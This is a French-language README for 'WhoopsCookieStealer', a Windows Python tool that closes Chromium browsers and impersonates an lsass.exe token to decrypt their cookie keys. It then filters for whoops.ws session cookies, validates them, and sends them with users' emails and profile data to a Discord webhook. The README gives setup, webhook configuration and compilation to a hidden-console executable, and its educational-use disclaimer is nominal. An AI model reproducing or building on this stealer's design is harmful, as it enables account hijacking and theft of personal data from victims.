# WhoopsCookieStealer

## Table des matières

- [Description](#description)
- [Fonctionnalités](#fonctionnalités)
- [Navigateurs supportés](#navigateurs-supportés)
- [Prérequis](#prérequis)
- [Installation](#installation)
- [Configuration](#configuration)
- [Utilisation](#utilisation)
- [Compilation](#compilation)
- [Structure du projet](#structure-du-projet)
- [Fonctionnement technique](#fonctionnement-technique)
- [Avertissements](#avertissements)

## Description

WhoopsCookieStealer est un script Python qui extrait et vérifie les cookies de session de navigateurs basés sur Chromium. Il cible spécifiquement les cookies d'authentification du site whoops.ws et valide leur authenticité avant de les transmettre via un webhook Discord.

L'outil parcourt plusieurs navigateurs installés sur le système, décrypte leurs bases de données de cookies, identifie les sessions valides et envoie les informations récupérées à une URL de webhook configurée.

## Fonctionnalités

- Extraction automatique des cookies depuis plusieurs navigateurs
- Décryptage des cookies chiffrés avec les clés de chiffrement des navigateurs
- Vérification de la validité des cookies via l'API de whoops.ws
- Collecte d'informations utilisateur associées aux sessions valides
- Envoi automatique des données via webhook Discord avec formatage embeds
- Support des méthodes de chiffrement v20 (AES-GCM, ChaCha20-Poly1305)
- Impersonation de processus système pour accéder aux clés de chiffrement
- Fermeture automatique des navigateurs avant extraction pour éviter les conflits de verrous

## Navigateurs supportés

L'outil prend en charge les navigateurs suivants :

- Google Chrome
- Microsoft Edge
- Brave
- Opera
- Opera GX
- Vivaldi
- Chromium
- Iridium

## Prérequis

- Windows (l'outil utilise des API Windows spécifiques)
- Python 3.7 ou supérieur
- Droits administrateur (requis pour l'impersonation de processus système)
- Connexion Internet (pour la validation des cookies et l'envoi du webhook)

## Installation

### Méthode rapide

1. Exécutez le fichier `Quick Setup.bat` qui installera automatiquement toutes les dépendances nécessaires.

### Méthode manuelle

1. Installez les dépendances Python via pip :

```bash
pip install -r requirements.txt
```

Les dépendances requises sont :

- pythonforwindows
- requests
- pycryptodome
- pyinstaller

## Configuration

Ouvrez le fichier `WhoopsCookieStealer.py` et modifiez la constante `WEBHOOK_URL` avec l'URL de votre webhook Discord :

```python
WEBHOOK_URL = "https://discord.com/api/webhooks/VOTRE_WEBHOOK_URL_ICI"
```

Pour créer un webhook Discord :

1. Accédez aux paramètres de votre serveur Discord
2. Allez dans Intégrations puis Webhooks
3. Créez un nouveau webhook et copiez son URL

## Utilisation

### Exécution directe

1. Lancez le script avec les droits administrateur :

```bash
python WhoopsCookieStealer.py
```

Le script demandera automatiquement l'élévation des privilèges si nécessaire.

### Fonctionnement

Le script effectue les étapes suivantes :

1. Vérifie et demande les droits administrateur si nécessaire
2. Ferme tous les navigateurs supportés pour libérer les bases de données
3. Parcourt chaque navigateur installé sur le système
4. Extrait et décrypte la clé maître de chiffrement de chaque navigateur
5. Ouvre les bases de données de cookies SQLite
6. Déchiffre tous les cookies et filtre ceux liés à whoops.ws
7. Valide chaque cookie en interrogeant l'API de whoops.ws
8. Collecte les informations utilisateur pour les cookies valides
9. Envoie les données via le webhook Discord configuré

## Compilation

Pour compiler le script en exécutable autonome :

1. Exécutez le fichier `Compile.bat`
2. L'exécutable sera généré dans le dossier `Compiled`

Le script de compilation utilise PyInstaller pour créer un fichier exécutable Windows avec toutes les dépendances incluses.

Options de compilation utilisées :

- `--onefile` : crée un seul fichier exécutable
- `--windowed` : masque la console lors de l'exécution
- `--noconfirm` : écrase les fichiers existants sans confirmation

## Structure du projet

```
WhoopsCookieStealer/
├── WhoopsCookieStealer.py    # Script principal
├── requirements.txt           # Dépendances Python
├── Compile.bat               # Script de compilation
├── Quick Setup.bat           # Script d'installation rapide
└── Compiled/                 # Dossier contenant les exécutables compilés
```

## Fonctionnement technique

### Décryptage des cookies

Le script gère plusieurs méthodes de chiffrement utilisées par les navigateurs Chromium :

1. **Méthode v20 (flag 1)** : Utilise AES-GCM avec une clé maître hardcodée
2. **Méthode v20 (flag 2)** : Utilise ChaCha20-Poly1305 avec une clé maître hardcodée
3. **Méthode v20 (flag 3)** : Utilise AES-GCM avec une clé chiffrée par CNG (Cryptography Next Generation)
4. **Méthode legacy** : Utilise DPAPI (Data Protection API) de Windows

### Accès aux clés de chiffrement

Pour accéder aux clés de chiffrement protégées par le système, le script :

1. Active le privilège SeDebugPrivilege
2. Obtient un token du processus lsass.exe
3. Crée un token d'impersonation pour accéder aux données système protégées
4. Utilise ce token pour décrypter les clés de chiffrement via DPAPI ou CNG

### Validation des cookies

Chaque cookie identifié comme potentiellement valide est testé en envoyant une requête à l'API de whoops.ws avec le cookie en question. Si la réponse est valide, les informations utilisateur sont extraites et ajoutées à la liste des cookies valides.

### Envoi des données

Les données sont formatées en embeds Discord avec les informations suivantes :

- Nom d'affichage
- Nom d'utilisateur
- Identifiant utilisateur
- Adresse email
- URL de l'avatar
- Plan d'abonnement
- Date de création du compte
- Cookie de session complet

## Avertissements

- Cet outil nécessite des droits administrateur pour fonctionner
- L'utilisation de cet outil peut violer les conditions d'utilisation des services concernés
- L'extraction de cookies sans autorisation peut être illégale selon votre juridiction
- Utilisez cet outil uniquement à des fins éducatives ou sur des systèmes dont vous êtes propriétaire et avez autorisé l'accès
- Les cookies peuvent contenir des informations sensibles permettant un accès non autorisé à des comptes

# Crédits

Pour la décryption des cookie, je suis parti d'une base accessible [ici](https://github.com/runassu/chrome_v20_decryption/blob/main/decrypt_chrome_v20_cookie.py).
